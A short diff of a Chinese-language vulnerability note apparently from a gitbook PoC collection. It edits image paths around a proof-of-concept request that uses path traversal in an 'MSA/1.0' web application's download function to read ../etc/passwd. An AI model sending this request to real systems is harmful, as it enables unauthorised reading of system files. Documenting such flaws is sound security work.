@@ -20,12 +20,12 @@ app="MSA/1.0"
 
 登录页面如下
 
-![](images/202202162301720.png)
+![](../.gitbook/assets/202202162301720.png)
 
 构造POC
 
-```plain
+```
 /msa/main.xp?Fun=msaDataCenetrDownLoadMore+delflag=1+downLoadFileName=msagroup.txt+downLoadFile=../etc/passwd
 ```
 
-![](images/202202162301323.png)
+![](../.gitbook/assets/202202162301323.png)
